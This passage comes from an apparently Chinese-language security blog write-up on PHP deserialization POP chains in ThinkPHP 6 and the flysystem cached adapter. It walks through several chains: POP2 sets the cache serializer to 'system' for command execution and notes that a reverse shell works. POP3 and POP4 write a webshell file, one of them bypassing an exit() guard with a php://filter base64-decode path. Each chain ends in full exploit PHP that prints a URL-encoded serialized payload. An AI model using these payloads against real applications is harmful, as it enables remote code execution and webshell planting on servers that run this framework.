            }
        }
    }
    namespace think\model\concern{
        trait Attribute
        {
        }
    }
    namespace think\model{
        use think\Model;
        class Pivot extends Model
        {
        }
        $a = new Pivot('');
        $b = new Pivot($a);
        echo urlencode(serialize($b));
    }
## POP2
入口：`vendor/league/flysystem-cached-adapter/src/Storage/AbstractCache.php`
让`$autosave = false`，
因为`AbstractCache`为抽象类，所以需要找一下它的子类，`/vendor/topthink/framework/src/think/filesystem/CacheStore.php`，因为里面实现了`save`方法，
继续跟进`getForStorage`，
跟进`cleanContents`方法，
只要不是嵌套数组，就可以直接`return`回来，返回到`json_encode`，他返回`json`格式数据后，再回到`save`方法的`set`方法，
因为`$this->store`可控，我们可以调用任意类的`set`方法，如果该类没用`set`方法，所以可能触发`__call`。当然也有可能自身的`set`方法就可以利用，找到可利用`set`方法，`src/think/cache/driver/File.php`，
跟进`getCacheKey`，这里其实就是为了查看进入该方法是否出现错误或者直接`return`了，
所以这里`$this->option['hash_type']`不能为空，然后进入`serialize`方法，`src/think/cache/Driver.php`，
这里发现`options`可控，如果我们将其赋值为`system`，那么`return`的就是我们命令执行函数，`$data`我们是可以传入的，那就可以RCE，回溯`$data`是如何传入的，即`save`方法传入的`$contents`，但是`$contents`是经过了`json_encode`处理后的`json`格式数据，那有什么函数可以出来`json`格式数据呢？经过测试发现`system`可以利用：
链子如下：
    /vendor/league/flysystem-cached-adapter/src/Storage/AbstractCache.php::__destruct()
    /vendor/topthink/framework/src/think/filesystem/CacheStore.php::save()
    /vendor/topthink/framework/src/think/cache/driver.php::set()
    /vendor/topthink/framework/src/think/cache/driver.php::serialize()
exp如下：
    store = $store;
            }
        }
    }
    namespace think\cache{
        abstract class Driver
        {
            protected $options = [
                'expire' => 0,
                'cache_subdir' => true,
                'prefix' => '',
                'path' => '',
                'hash_type' => 'md5',
                'data_compress' => false,
                'tag_prefix' => 'tag:',
                'serialize' => ['system'],
            ];
        }
    }
    namespace think\cache\driver{
        use think\cache\Driver;
        class File extends Driver{}
    }
    namespace{
        $file = new think\cache\driver\File();
        $cache = new think\filesystem\CacheStore($file);
        echo urlencode(serialize($cache));
    }
    ?>
但是没有回显，但是能够反弹 shell ，
## POP3
这里其实和 POP2 一样，只是最终利用点发生了些许变化，调用关系还是一样：
    /vendor/league/flysystem-cached-adapter/src/Storage/AbstractCache.php::__destruct()
    /vendor/topthink/framework/src/think/filesystem/CacheStore.php::save()
    /vendor/topthink/framework/src/think/cache/driver.php::set()
    /vendor/topthink/framework/src/think/cache/driver.php::serialize()
POP2 是利用的控制`serialize`函数来RCE，但下面还存在一个`file_put_contents($filename,
$data)`函数，我们也可以利用它来写入 shell，
我们还是需要去查看文件名是否可控，进入`getCacheKey`方法，
可以发现我们可以控制文件名，而且可以在`$this->options['path']`添加伪协议，再看写入数据`$data`是否可控呢，可以看到存在一个`exit`方法来限制我们操作，可以伪协议`filter`可以绕过它，可参考我博客的分析`https://woshilnp.github.io/2021/05/23/%E8%AF%A6%E8%A7%A3php-filter%E4%BB%A5%E5%8F%8A%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87/`
所以文件名和内容都可控，exp：
    store = $store;
            }
        }
    }
    namespace think\cache{
        abstract class Driver
        {
            protected $options = ["serialize"=>["trim"],"expire"=>1,"prefix"=>0,"hash_type"=>"md5","cache_subdir"=>0,"path"=>"php://filter/write=convert.base64-decode/resource=","data_compress"=>0];
        }
    }
    namespace think\cache\driver{
        use think\cache\Driver;
        class File extends Driver{}
    }
    namespace{
        $file = new think\cache\driver\File();
        $cache = new think\filesystem\CacheStore($file);
        echo urlencode(serialize($cache));
    }
     ?>
成功写入
## POP4
入口：`League\Flysystem\Cached\Storage\AbstractCache`，
因为`AbstractCache`为抽象类，所以需要找一下它的子类，`src/Storage/Adapter.php`
让`$autosave = false`即可进入`save`方法，
有一个`write`方法，`$content`为`getForStorage`方法返回值，上文已分析该参数可控，所以可以用来写马。
所以我们需要找一个有`has`方法和`write`方法的对象利用，`src/Adapter/Local.php`
`has()`方法用来判断文件是否已存在，只需要构建文件名不存在即可，进入`write`方法，
这里可以执行`file_put_contents()`，写入`shell`，跟进`applyPathPrefix`方法，
然后`getPathPrefix`方法返回的是该类的一个属性，因为默认为NULL，所以`file_put_contents`第一个参数就是`$path`变量，回溯该变量，也即是`Adapter`类中的`$file`属性，所以让`$file`属性为文件名，所以文件名`$file`可控，文件内容`$contents`可控，所以写入`shell`，exp：
    '];
    }
    namespace League\Flysystem\Cached\Storage;
    class Adapter extends AbstractCache
    {
        protected $adapter;
        protected $file;
        public function __construct($obj)
        {
            $this->adapter = $obj;
            $this->file = 'w0s1np.php';
        }
    }
    namespace League\Flysystem\Adapter;
    abstract class AbstractAdapter
    {
    }
    namespace League\Flysystem\Adapter;
    use League\Flysystem\Cached\Storage\Adapter;
    use League\Flysystem\Config;
    class Local extends AbstractAdapter
    {
        public function has($path)
        {
        }
        public function write($path, $contents, Config $config)
        {
        }
    }
    $a = new Local();
    $b = new Adapter($a);
    echo urlencode(serialize($b));
    ?>
成功写入